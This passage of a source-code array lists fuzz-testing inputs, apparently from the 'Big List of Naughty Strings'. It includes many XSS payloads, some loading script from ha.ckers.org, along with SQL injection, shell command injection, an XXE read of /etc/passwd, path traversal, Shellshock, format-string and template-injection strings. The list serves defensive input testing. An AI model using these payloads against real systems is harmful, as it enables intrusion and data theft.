    "<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "`\"\'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>",
    "`\"\'><img src=xxx:x \\x22onerror=javascript:alert(1)>",
    "`\"\'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>",
    "`\"\'><img src=xxx:x \\x0Donerror=javascript:alert(1)>",
    "`\"\'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>",
    "`\"\'><img src=xxx:x \\x09onerror=javascript:alert(1)>",
    "`\"\'><img src=xxx:x \\x0Conerror=javascript:alert(1)>",
    "`\"\'><img src=xxx:x \\x00onerror=javascript:alert(1)>",
    "`\"\'><img src=xxx:x \\x27onerror=javascript:alert(1)>",
    "`\"\'><img src=xxx:x \\x20onerror=javascript:alert(1)>",
    "\"`\'><script>\\x3Bjavascript:alert(1)</script>",
    "\"`\'><script>\\x0Djavascript:alert(1)</script>",
    "\"`\'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x81javascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x84javascript:alert(1)</script>",
    "\"`\'><script>\\xE3\\x80\\x80javascript:alert(1)</script>",
    "\"`\'><script>\\x09javascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x89javascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x85javascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x88javascript:alert(1)</script>",
    "\"`\'><script>\\x00javascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>",
    "\"`\'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>",
    "\"`\'><script>\\x0Cjavascript:alert(1)</script>",
    "\"`\'><script>\\x2Bjavascript:alert(1)</script>",
    "\"`\'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>",
    "\"`\'><script>-javascript:alert(1)</script>",
    "\"`\'><script>\\x0Ajavascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>",
    "\"`\'><script>\\x7Ejavascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x87javascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>",
    "\"`\'><script>\\xC2\\x85javascript:alert(1)</script>",
    "\"`\'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x83javascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>",
    "\"`\'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x80javascript:alert(1)</script>",
    "\"`\'><script>\\x21javascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x82javascript:alert(1)</script>",
    "\"`\'><script>\\xE2\\x80\\x86javascript:alert(1)</script>",
    "\"`\'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>",
    "\"`\'><script>\\x0Bjavascript:alert(1)</script>",
    "\"`\'><script>\\x20javascript:alert(1)</script>",
    "\"`\'><script>\\xC2\\xA0javascript:alert(1)</script>",
    "<img \\x00src=x onerror=\"alert(1)\">",
    "<img \\x47src=x onerror=\"javascript:alert(1)\">",
    "<img \\x11src=x onerror=\"javascript:alert(1)\">",
    "<img \\x12src=x onerror=\"javascript:alert(1)\">",
    "<img\\x47src=x onerror=\"javascript:alert(1)\">",
    "<img\\x10src=x onerror=\"javascript:alert(1)\">",
    "<img\\x13src=x onerror=\"javascript:alert(1)\">",
    "<img\\x32src=x onerror=\"javascript:alert(1)\">",
    "<img\\x47src=x onerror=\"javascript:alert(1)\">",
    "<img\\x11src=x onerror=\"javascript:alert(1)\">",
    "<img \\x47src=x onerror=\"javascript:alert(1)\">",
    "<img \\x34src=x onerror=\"javascript:alert(1)\">",
    "<img \\x39src=x onerror=\"javascript:alert(1)\">",
    "<img \\x00src=x onerror=\"javascript:alert(1)\">",
    "<img src\\x09=x onerror=\"javascript:alert(1)\">",
    "<img src\\x10=x onerror=\"javascript:alert(1)\">",
    "<img src\\x13=x onerror=\"javascript:alert(1)\">",
    "<img src\\x32=x onerror=\"javascript:alert(1)\">",
    "<img src\\x12=x onerror=\"javascript:alert(1)\">",
    "<img src\\x11=x onerror=\"javascript:alert(1)\">",
    "<img src\\x00=x onerror=\"javascript:alert(1)\">",
    "<img src\\x47=x onerror=\"javascript:alert(1)\">",
    "<img src=x\\x09onerror=\"javascript:alert(1)\">",
    "<img src=x\\x10onerror=\"javascript:alert(1)\">",
    "<img src=x\\x11onerror=\"javascript:alert(1)\">",
    "<img src=x\\x12onerror=\"javascript:alert(1)\">",
    "<img src=x\\x13onerror=\"javascript:alert(1)\">",
    "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">",
    "<img src=x onerror=\\x09\"javascript:alert(1)\">",
    "<img src=x onerror=\\x10\"javascript:alert(1)\">",
    "<img src=x onerror=\\x11\"javascript:alert(1)\">",
    "<img src=x onerror=\\x12\"javascript:alert(1)\">",
    "<img src=x onerror=\\x32\"javascript:alert(1)\">",
    "<img src=x onerror=\\x00\"javascript:alert(1)\">",
    "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>",
    "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>",
    "<img src onerror /\" \'\"= alt=javascript:alert(1)//\">",
    "<title onpropertychange=javascript:alert(1)></title><title title=>",
    "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">",
    "<!--[if]><script>javascript:alert(1)</script -->",
    "<!--[if<img src=x onerror=javascript:alert(1)//]> -->",
    "<script src=\"/\\%(jscript)s\"></script>",
    "<script src=\"\\\\%(jscript)s\"></script>",
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<IMG SRC=# onmouseover=\"alert(\'xxs\')\">",
    "<IMG SRC= onmouseover=\"alert(\'xxs\')\">",
    "<IMG onmouseover=\"alert(\'xxs\')\">",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
    "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
    "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
    "<IMG SRC=\"jav   ascript:alert(\'XSS\');\">",
    "<IMG SRC=\"jav&#x09;ascript:alert(\'XSS\');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert(\'XSS\');\">",
    "<IMG SRC=\"jav&#x0D;ascript:alert(\'XSS\');\">",
    "perl -e \'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";\' > out",
    "<IMG SRC=\" &#14;  javascript:alert(\'XSS\');\">",
    "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
    "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
    "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
    "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >",
    "<SCRIPT SRC=//ha.ckers.org/.j>",
    "<IMG SRC=\"javascript:alert(\'XSS\')\"",
    "<iframe src=http://ha.ckers.org/scriptlet.html <",
    "\\\";alert(\'XSS\');//",
    "<u oncopy=alert()> Copy me</u>",
    "<i onwheel=alert(1)> Scroll over me </i>",
    "<plaintext>",
    "http://a/%%30%30",
    "</textarea><script>alert(123)</script>",
    "1;DROP TABLE users",
    "1\'; DROP TABLE users-- 1",
    "\' OR 1=1 -- 1",
    "\' OR \'1\'=\'1",
    "\'; EXEC sp_MSForEachTable \'DROP TABLE ?\'; --",
    " ",
    "%",
    "_",
    "-",
    "--",
    "--version",
    "--help",
    "$USER",
    "/dev/null; touch /tmp/blns.fail ; echo",
    "`touch /tmp/blns.fail`",
    "$(touch /tmp/blns.fail)",
    "@{[system \"touch /tmp/blns.fail\"]}",
    "eval(\"puts \'hello world\'\")",
    "System(\"ls -al /\")",
    "`ls -al /`",
    "Kernel.exec(\"ls -al /\")",
    "Kernel.exit(1)",
    "%x(\'ls -al /\')",
    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
    "$HOME",
    "$ENV{\'HOME\'}",
    "%d",
    "%s%s%s%s%s",
    "{0}",
    "%*.*s",
    "%@",
    "%n",
    "File:///",
    "../../../../../../../../../../../etc/passwd%00",
    "../../../../../../../../../../../etc/hosts",
    "() { 0; }; touch /tmp/blns.shellshock1.fail;",
    "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }",
    "<<< %s(un=\'%s\') = %u",
    "+++ATH0",
    "CON",
    "PRN",
    "AUX",
    "CLOCK$",
    "NUL",
    "A:",
    "ZZ:",
    "COM1",
    "LPT1",
    "LPT2",
    "LPT3",
    "COM2",
    "COM3",
    "COM4",
    "DCC SEND STARTKEYLOGGER 0 0 0",
    "Scunthorpe General Hospital",
    "Penistone Community Church",
    "Lightwater Country Park",
    "Jimmy Clitheroe",
    "Horniman Museum",
    "shitake mushrooms",
    "RomansInSussex.co.uk",
    "http://www.cum.qc.ca/",
    "Craig Cockburn, Software Specialist",
    "Linda Callahan",
    "Dr. Herman I. Libshitz",
    "magna cum laude",
    "Super Bowl XXX",
    "medieval erection of parapets",
    "evaluate",
    "mocha",
    "expression",
    "Arsenal canal",
    "classic",
    "Tyson Gay",
    "Dick Van Dyke",
    "basement",
    "If you\'re reading this, you\'ve been in a coma for almost 20 years now. We\'re trying a new technique. We don\'t know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.",
    "Roses are \u{1b}[0;31mred\u{1b}[0m, violets are \u{1b}[0;34mblue. Hope you enjoy terminal hue",
    "But now...\u{1b}[20Cfor my greatest trick...\u{1b}[8m",
    "The quic\u{8}\u{8}\u{8}\u{8}\u{8}\u{8}k brown fo\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}x... [Beeeep]",
    "Powerل\u{64f}ل\u{64f}ص\u{651}ب\u{64f}ل\u{64f}لص\u{651}ب\u{64f}رر\u{64b} \u{963} \u{963}h \u{963} \u{963}冗",
    "🏳0🌈\u{fe0f}",
    "జ\u{c4d}ఞ\u{200c}\u{c3e}",
    "گچپژ",
    "{% print \'x\' * 64 * 1024**3 %}",
    "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}",
];
